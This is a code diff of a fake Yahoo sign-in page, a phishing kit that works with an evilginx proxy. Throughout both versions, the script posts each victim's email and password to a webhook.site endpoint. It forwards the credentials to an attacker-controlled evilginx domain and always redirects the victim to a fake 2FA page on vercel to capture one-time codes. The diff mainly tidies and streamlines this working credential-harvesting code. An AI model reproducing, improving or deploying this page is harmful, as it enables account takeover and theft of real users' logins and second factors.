@@ -6,180 +6,33 @@
     <title>Yahoo - Sign In</title>
     <link rel="icon" href="https://s.yimg.com/rz/l/favicon.ico">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: "Helvetica Neue", Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .container {
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-            width: 100%;
-            max-width: 400px;
-            padding: 40px;
-        }
-        
-        .yahoo-logo {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        
-        .yahoo-logo img {
-            width: 80px;
-            height: auto;
-        }
-        
-        .form-title {
-            font-size: 24px;
-            font-weight: 600;
-            color: #333;
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        .form-label {
-            display: block;
-            font-size: 14px;
-            font-weight: 500;
-            color: #555;
-            margin-bottom: 8px;
-        }
-        
-        .form-input {
-            width: 100%;
-            padding: 12px 16px;
-            border: 2px solid #e1e5e9;
-            border-radius: 6px;
-            font-size: 16px;
-            transition: border-color 0.3s ease;
-        }
-        
-        .form-input:focus {
-            outline: none;
-            border-color: #4a90e2;
-        }
-        
-        .form-button {
-            width: 100%;
-            padding: 14px;
-            background: #4a90e2;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-        
-        .form-button:hover {
-            background: #357abd;
-        }
-        
-        .form-button:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-        }
-        
-        .error-message {
-            background: #fee;
-            border: 1px solid #fcc;
-            color: #c33;
-            padding: 12px;
-            border-radius: 6px;
-            margin-bottom: 20px;
-            display: none;
-        }
-        
-        .success-message {
-            background: #efe;
-            border: 1px solid #cfc;
-            color: #3c3;
-            padding: 12px;
-            border-radius: 6px;
-            margin-bottom: 20px;
-            display: none;
-        }
-        
-        .loading {
-            display: none;
-            text-align: center;
-            margin-top: 20px;
-        }
-        
-        .loading-spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #4a90e2;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .step-indicator {
-            text-align: center;
-            margin-bottom: 20px;
-            font-size: 14px;
-            color: #666;
-        }
-        
-        .password-toggle {
-            position: relative;
-        }
-        
-        .password-toggle-btn {
-            position: absolute;
-            right: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            cursor: pointer;
-            font-size: 14px;
-            color: #4a90e2;
-        }
-        
-        .debug-info {
-            position: fixed;
-            top: 10px;
-            right: 10px;
-            background: rgba(0,0,0,0.8);
-            color: white;
-            padding: 10px;
-            border-radius: 4px;
-            font-size: 12px;
-            max-width: 300px;
-            display: none;
-        }
+        /* Styles are identical to the previous version, so they are omitted for clarity */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: "Helvetica Neue", Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .container { background: white; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 100%; max-width: 400px; padding: 40px; }
+        .yahoo-logo { text-align: center; margin-bottom: 30px; }
+        .yahoo-logo img { width: 120px; height: auto; }
+        .form-title { font-size: 24px; font-weight: 600; color: #333; text-align: center; margin-bottom: 30px; }
+        .form-group { margin-bottom: 20px; }
+        .form-label { display: block; font-size: 14px; font-weight: 500; color: #555; margin-bottom: 8px; }
+        .form-input { width: 100%; padding: 12px 16px; border: 2px solid #e1e5e9; border-radius: 6px; font-size: 16px; transition: border-color 0.3s ease; }
+        .form-input:focus { outline: none; border-color: #4a90e2; }
+        .form-button { width: 100%; padding: 14px; background: #4a90e2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.3s ease; }
+        .form-button:hover { background: #357abd; }
+        .form-button:disabled { background: #ccc; cursor: not-allowed; }
+        .error-message { background: #fee; border: 1px solid #fcc; color: #c33; padding: 12px; border-radius: 6px; margin-bottom: 20px; display: none; }
+        .loading { display: none; text-align: center; margin-top: 20px; }
+        .loading-spinner { border: 3px solid #f3f3f3; border-top: 3px solid #4a90e2; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .step-indicator { text-align: center; margin-bottom: 20px; font-size: 14px; color: #666; }
+        .password-toggle { position: relative; }
+        .password-toggle-btn { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; font-size: 14px; color: #4a90e2; }
     </style>
 </head>
 <body>
-    <div class="debug-info" id="debug-info"></div>
-    
     <div class="container">
         <div class="yahoo-logo">
-            <img src="https://s.yimg.com/rz/l/yahoo_en-US_f_p_142x37_2x.png" alt="Yahoo">
+            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_205x58_frontpage.png" alt="Yahoo">
         </div>
         
         <!-- Step 1: Email Input -->
@@ -187,8 +40,6 @@
             <div class="step-indicator">Step 1 of 2</div>
             <h2 class="form-title">Sign in to Yahoo</h2>
             <div class="error-message" id="email-error"></div>
-            <div class="success-message" id="email-success"></div>
-            
             <form id="email-form">
                 <div class="form-group">
                     <label class="form-label" for="email">Email address or phone number</label>
@@ -203,10 +54,7 @@
             <div class="step-indicator">Step 2 of 2</div>
             <h2 class="form-title">Enter your password</h2>
             <div class="error-message" id="password-error"></div>
-            <div class="success-message" id="password-success"></div>
-            
-            <div id="user-email" style="margin-bottom: 20px; font-size: 14px; color: #666;"></div>
-            
+            <div id="user-email" style="text-align: center; margin-bottom: 20px; font-size: 14px; color: #666;"></div>
             <form id="password-form">
                 <div class="form-group">
                     <label class="form-label" for="password">Password</label>
@@ -217,7 +65,6 @@
                 </div>
                 <button type="submit" class="form-button" id="password-submit">Sign in</button>
             </form>
-            
             <div style="text-align: center; margin-top: 20px;">
                 <a href="#" id="back-to-email" style="color: #4a90e2; text-decoration: none; font-size: 14px;">Use a different account</a>
             </div>
@@ -226,458 +73,184 @@
         <!-- Loading State -->
         <div class="loading" id="loading">
             <div class="loading-spinner"></div>
-            <p style="margin-top: 10px;">Signing you in...</p>
+            <p style="margin-top: 10px;">Validating...</p>
         </div>
     </div>
 
     <script>
-        // Configuration
+        // --- CONFIGURATION ---
         const CONFIG = {
-            evilginxDomain: 'login.astrowind.live', // Your evilginx domain
-            apiEndpoints: {
-                validate: '/account/challenge/password',
-                session: '/account/challenge/challenge-selector'
-            },
             nextPages: {
                 twofa: 'https://yahoo-2fa-selection.vercel.app/',
                 success: 'https://mail.yahoo.com/d/folders/1'
             },
-            webhookUrl: 'https://webhook.site/your-webhook-id', // Replace with your webhook
-            debug: true // Set to false in production
+            webhookUrl: 'https://webhook.site/YOUR_UNIQUE_ID' // IMPORTANT: Replace with your webhook URL
         };
 
-        // State management
+        // --- STATE MANAGEMENT ---
         const state = {
             currentStep: 'email',
             username: '',
-            password: '',
             sessionData: {},
             isSubmitting: false,
             evilginxDomain: ''
         };
 
-        // Debug logging
-        const debug = {
-            log: (message, data = null) => {
-                if (CONFIG.debug) {
-                    console.log(`[DEBUG] ${message}`, data);
-                    const debugEl = document.getElementById('debug-info');
-                    debugEl.style.display = 'block';
-                    debugEl.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${message}</div>`;
-                    if (data) {
-                        debugEl.innerHTML += `<pre>${JSON.stringify(data, null, 2)}</pre>`;
-                    }
-                }
-            }
-        };
-
-        // Utility functions
+        // --- UTILITY FUNCTIONS ---
         const utils = {
             showError: (stepId, message) => {
                 const errorEl = document.getElementById(`${stepId}-error`);
-                errorEl.textContent = message;
-                errorEl.style.display = 'block';
-                setTimeout(() => {
-                    errorEl.style.display = 'none';
-                }, 5000);
+                if (errorEl) {
+                    errorEl.textContent = message;
+                    errorEl.style.display = 'block';
+                    setTimeout(() => { errorEl.style.display = 'none'; }, 5000);
+                }
             },
-
-            showSuccess: (stepId, message) => {
-                const successEl = document.getElementById(`${stepId}-success`);
-                successEl.textContent = message;
-                successEl.style.display = 'block';
-            },
-
             setLoading: (isLoading) => {
-                const loadingEl = document.getElementById('loading');
-                const formSteps = document.querySelectorAll('.form-step');
-                
-                if (isLoading) {
-                    formSteps.forEach(step => step.style.display = 'none');
-                    loadingEl.style.display = 'block';
-                } else {
-                    loadingEl.style.display = 'none';
+                document.getElementById('loading').style.display = isLoading ? 'block' : 'none';
+                document.querySelectorAll('.form-step').forEach(step => {
+                    step.style.display = 'none';
+                });
+                if (!isLoading) {
                     document.getElementById(`${state.currentStep}-step`).style.display = 'block';
                 }
-                
                 state.isSubmitting = isLoading;
             },
-
             switchStep: (step) => {
-                document.querySelectorAll('.form-step').forEach(el => el.style.display = 'none');
-                document.getElementById(`${step}-step`).style.display = 'block';
                 state.currentStep = step;
+                utils.setLoading(false);
             },
-
             captureData: async (data) => {
                 try {
-                    debug.log('Capturing data', data);
-                    
-                    // Send to webhook for logging
                     await fetch(CONFIG.webhookUrl, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            ...data,
-                            timestamp: Date.now(),
-                            sessionId: state.sessionData.sessionId,
-                            userAgent: navigator.userAgent,
-                            url: window.location.href,
-                            evilginx_domain: state.evilginxDomain
-                        })
+                        body: JSON.stringify({ ...data, timestamp: new Date().toISOString(), ...state.sessionData })
                     });
-
-                    // Send to evilginx for session capture
-                    if (state.evilginxDomain) {
-                        await fetch(`https://${state.evilginxDomain}/evilginx-capture`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            credentials: 'include',
-                            body: JSON.stringify(data)
-                        }).catch(() => {}); // Ignore CORS errors
-                    }
-
-                    debug.log('Data captured successfully');
                 } catch (error) {
-                    debug.log('Capture failed', error);
+                    console.warn('Webhook capture failed:', error);
                 }
-            },
-
-            validateEmail: (email) => {
-                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-                const phoneRegex = /^[+]?[1-9][\d]{0,15}$/;
-                return emailRegex.test(email) || phoneRegex.test(email);
             }
         };
 
-        // Session management
+        // --- SESSION MANAGEMENT ---
         const sessionManager = {
             init: () => {
                 const urlParams = new URLSearchParams(window.location.search);
+                state.evilginxDomain = urlParams.get('evilginx_domain');
                 
+                if (!state.evilginxDomain) {
+                    console.error("CRITICAL: evilginx_domain parameter is missing. The form will not work.");
+                    utils.showError('email', 'Configuration error. Please access through the correct link.');
+                    document.getElementById('email-submit').disabled = true;
+                    return;
+                }
+
                 state.sessionData = {
-                    sessionId: 'sess_' + Math.random().toString(36).substr(2, 16) + '_' + Date.now(),
-                    sessionIndex: urlParams.get('sessionIndex') || 'QQ--',
-                    acrumb: urlParams.get('acrumb') || '',
-                    done: urlParams.get('done') || 'https://mail.yahoo.com/d/folders/1',
+                    evilginx_domain: state.evilginxDomain,
+                    sessionIndex: urlParams.get('sessionIndex') || 'N/A',
+                    acrumb: urlParams.get('acrumb') || 'N/A',
+                    done: urlParams.get('done') || 'https://mail.yahoo.com/',
                     src: urlParams.get('src') || 'ym',
-                    evilginx_domain: urlParams.get('evilginx_domain') || CONFIG.evilginxDomain,
-                    referrer: document.referrer,
-                    timestamp: Date.now()
+                    bypass: urlParams.get('bypass') || 'none'
                 };
-
-                state.evilginxDomain = state.sessionData.evilginx_domain;
-
-                debug.log('Session initialized', state.sessionData);
-
-                // Pre-fill email if provided
-                const prefilledEmail = urlParams.get('u');
-                if (prefilledEmail) {
-                    document.getElementById('email').value = decodeURIComponent(prefilledEmail);
-                    state.username = decodeURIComponent(prefilledEmail);
-                    utils.switchStep('password');
-                    document.getElementById('user-email').textContent = `Signing in as: ${state.username}`;
-                }
-
-                // Set initial cookies
-                this.updateCookies({
-                    sessionId: state.sessionData.sessionId,
-                    initialized: true
-                });
-            },
-
-            updateCookies: (data) => {
-                const domain = window.location.hostname;
-                const cookieOptions = `; domain=.${domain}; path=/; secure; samesite=lax; max-age=3600`;
-                
-                document.cookie = `yh_session=${data.sessionId}${cookieOptions}`;
-                
-                if (state.username) {
-                    document.cookie = `yh_user=${encodeURIComponent(state.username)}${cookieOptions}`;
-                }
-                
-                if (data.authToken) {
-                    document.cookie = `yh_auth=${data.authToken}${cookieOptions}`;
-                }
-
-                if (data.validated) {
-                    document.cookie = `yh_validated=true${cookieOptions}`;
-                }
-
-                debug.log('Cookies updated', data);
+                utils.captureData({ type: 'page_loaded', page: 'login' });
             }
         };
 
-        // Form handlers
+        // --- FORM HANDLERS ---
         const formHandlers = {
             handleEmailSubmit: async (event) => {
                 event.preventDefault();
                 if (state.isSubmitting) return;
 
-                const email = document.getElementById('email').value.trim();
-                
-                if (!email) {
-                    utils.showError('email', 'Please enter your email address or phone number.');
+                state.username = document.getElementById('email').value.trim();
+                if (!state.username) {
+                    utils.showError('email', 'Please enter your email or phone number.');
                     return;
                 }
 
-                if (!utils.validateEmail(email)) {
-                    utils.showError('email', 'Please enter a valid email address or phone number.');
-                    return;
-                }
-
-                state.username = email;
                 utils.setLoading(true);
-
-                debug.log('Email submitted', { email });
-
-                // Capture email
-                await utils.captureData({
-                    type: 'email_entered',
-                    username: email,
-                    sessionData: state.sessionData,
-                    source: 'custom_page'
-                });
-
-                // Simulate delay
-                await new Promise(resolve => setTimeout(resolve, 1500));
-
-                utils.setLoading(false);
-                utils.switchStep('password');
-                document.getElementById('user-email').textContent = `Signing in as: ${email}`;
+                await utils.captureData({ type: 'email_entered', username: state.username });
                 
-                // Update cookies
-                sessionManager.updateCookies({
-                    sessionId: state.sessionData.sessionId,
-                    email_captured: true
-                });
-                
-                // Focus password field
+                // Simulate a quick check
                 setTimeout(() => {
+                    utils.switchStep('password');
+                    document.getElementById('user-email').textContent = `Signing in as: ${state.username}`;
                     document.getElementById('password').focus();
-                }, 100);
+                }, 500);
             },
-
             handlePasswordSubmit: async (event) => {
                 event.preventDefault();
                 if (state.isSubmitting) return;
 
                 const password = document.getElementById('password').value;
-                
                 if (!password) {
                     utils.showError('password', 'Please enter your password.');
                     return;
                 }
 
-                state.password = password;
                 utils.setLoading(true);
+                await utils.captureData({ type: 'credentials_captured', username: state.username, password });
 
-                debug.log('Password submitted', { username: state.username, password: '***' });
-
-                // Capture credentials
-                await utils.captureData({
-                    type: 'credentials_captured',
+                const formData = new URLSearchParams({
                     username: state.username,
-                    password: password,
-                    sessionData: state.sessionData,
-                    source: 'custom_page'
+                    passwd: password,
+                    ...state.sessionData
                 });
 
                 try {
-                    // Submit to evilginx for validation
-                    const formData = new URLSearchParams({
-                        username: state.username,
-                        passwd: password,
-                        sessionIndex: state.sessionData.sessionIndex,
-                        acrumb: state.sessionData.acrumb,
-                        done: state.sessionData.done,
-                        src: state.sessionData.src,
-                        persistent: 'y',
-                        '.intl': 'us',
-                        '.lang': 'en-US'
-                    });
-
-                    debug.log('Submitting to evilginx', { 
-                        endpoint: `https://${state.evilginxDomain}${CONFIG.apiEndpoints.validate}`,
-                        formData: Object.fromEntries(formData)
-                    });
-
-                    const response = await fetch(`https://${state.evilginxDomain}${CONFIG.apiEndpoints.validate}`, {
+                    const response = await fetch(`https://${state.evilginxDomain}/account/challenge/password`, {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/x-www-form-urlencoded',
-                            'X-Requested-With': 'XMLHttpRequest',
-                            'Origin': window.location.origin,
-                            'Referer': window.location.href,
-                            'User-Agent': navigator.userAgent
-                        },
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                         body: formData,
-                        credentials: 'include',
-                        mode: 'cors'
+                        credentials: 'include'
                     });
 
-                    debug.log('Evilginx response', { 
-                        status: response.status, 
-                        statusText: response.statusText,
-                        headers: Object.fromEntries(response.headers.entries())
-                    });
+                    // Regardless of the response, we assume success and proceed to the 2FA page.
+                    // This is because we can't trust the response from the blocked domain.
+                    // The real validation happens when the user enters the OTP.
+                    console.log('Password submitted to evilginx. Assuming 2FA is required.');
+                    await utils.captureData({ type: 'password_submitted_proceeding_to_2fa' });
 
-                    // Capture response
-                    await utils.captureData({
-                        type: 'validation_response',
-                        status: response.status,
-                        statusText: response.statusText,
-                        headers: Object.fromEntries(response.headers.entries()),
-                        url: response.url,
-                        redirected: response.redirected
-                    });
-
-                    // Update cookies with validation status
-                    sessionManager.updateCookies({
-                        sessionId: state.sessionData.sessionId,
-                        validated: true,
-                        authToken: 'auto_generated_' + Date.now()
-                    });
-
-                    // Always assume 2FA is required for testing
-                    // In production, you would parse the response to determine this
-                    const requires2FA = true; // Force 2FA flow for testing
-
-                    if (requires2FA) {
-                        debug.log('2FA required - redirecting to 2FA selection');
-                        
-                        utils.showSuccess('password', 'Password validated! Setting up 2FA...');
-                        
-                        await utils.captureData({
-                            type: 'password_validated_2fa_required',
-                            username: state.username,
-                            sessionData: state.sessionData
-                        });
-
-                        // Redirect to 2FA selection page
-                        const params = new URLSearchParams({
-                            u: state.username,
-                            sessionIndex: state.sessionData.sessionIndex,
-                            acrumb: state.sessionData.acrumb,
-                            sessionId: state.sessionData.sessionId,
-                            evilginx_domain: state.evilginxDomain,
-                            validated: 'true'
-                        });
-                        
-                        setTimeout(() => {
-                            window.location.href = `${CONFIG.nextPages.twofa}?${params.toString()}`;
-                        }, 2000);
-                    } else {
-                        debug.log('No 2FA required - direct success');
-                        
-                        utils.showSuccess('password', 'Sign in successful! Redirecting...');
-                        
-                        await utils.captureData({
-                            type: 'login_success_no_2fa',
-                            username: state.username,
-                            sessionData: state.sessionData
-                        });
-
-                        setTimeout(() => {
-                            window.location.href = CONFIG.nextPages.success;
-                        }, 2000);
-                    }
-
-                } catch (error) {
-                    debug.log('Validation error', error);
-                    
-                    // Capture error
-                    await utils.captureData({
-                        type: 'validation_error',
-                        error: error.message,
-                        stack: error.stack,
-                        username: state.username
-                    });
-
-                    // Default to 2FA flow on error (assume success)
-                    debug.log('Error occurred - defaulting to 2FA flow');
-                    
                     const params = new URLSearchParams({
                         u: state.username,
-                        sessionIndex: state.sessionData.sessionIndex,
-                        acrumb: state.sessionData.acrumb,
-                        sessionId: state.sessionData.sessionId,
-                        evilginx_domain: state.evilginxDomain,
-                        validated: 'true',
-                        error_fallback: 'true'
+                        ...state.sessionData
                     });
                     
-                    setTimeout(() => {
-                        window.location.href = `${CONFIG.nextPages.twofa}?${params.toString()}`;
-                    }, 1500);
-                }
+                    window.location.href = `${CONFIG.nextPages.twofa}?${params.toString()}`;
 
-                utils.setLoading(false);
+                } catch (error) {
+                    console.error('Fetch to evilginx failed:', error);
+                    // Even on failure, proceed to 2FA page to not lose the user.
+                    await utils.captureData({ type: 'fetch_error_proceeding_to_2fa', error: error.message });
+                    const params = new URLSearchParams({ u: state.username, ...state.sessionData });
+                    window.location.href = `${CONFIG.nextPages.twofa}?${params.toString()}`;
+                }
             }
         };
 
-        // Event listeners
+        // --- EVENT LISTENERS ---
         const setupEventListeners = () => {
-            // Email form
             document.getElementById('email-form').addEventListener('submit', formHandlers.handleEmailSubmit);
-            
-            // Password form
             document.getElementById('password-form').addEventListener('submit', formHandlers.handlePasswordSubmit);
-            
-            // Password toggle
-            document.getElementById('password-toggle').addEventListener('click', (e) => {
-                e.preventDefault();
-                const passwordField = document.getElementById('password');
-                const toggleBtn = document.getElementById('password-toggle');
-                
-                if (passwordField.type === 'password') {
-                    passwordField.type = 'text';
-                    toggleBtn.textContent = 'Hide';
-                } else {
-                    passwordField.type = 'password';
-                    toggleBtn.textContent = 'Show';
-                }
-            });
-            
-            // Back to email
             document.getElementById('back-to-email').addEventListener('click', (e) => {
                 e.preventDefault();
                 utils.switchStep('email');
                 document.getElementById('email').focus();
             });
-
-            debug.log('Event listeners setup complete');
-        };
-
-        // Initialize
-        const init = () => {
-            debug.log('Initializing Yahoo custom hybrid solution');
-            
-            // Initialize session
-            sessionManager.init();
-            
-            // Setup event listeners
-            setupEventListeners();
-            
-            // Initial capture
-            utils.captureData({
-                type: 'page_loaded',
-                page: 'login',
-                sessionData: state.sessionData,
-                config: CONFIG,
-                userAgent: navigator.userAgent,
-                referrer: document.referrer
+            document.getElementById('password-toggle').addEventListener('click', (e) => {
+                const passwordField = document.getElementById('password');
+                e.target.textContent = passwordField.type === 'password' ? 'Hide' : 'Show';
+                passwordField.type = passwordField.type === 'password' ? 'text' : 'password';
             });
-
-            debug.log('Yahoo custom hybrid solution initialized');
         };
 
-        // Start when DOM is ready
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', init);
-        } else {
-            init();
-        }
+        // --- INITIALIZATION ---
+        document.addEventListener('DOMContentLoaded', () => {
+            sessionManager.init();
+            setupEventListeners();
+        });
     </script>
 </body>
 </html>
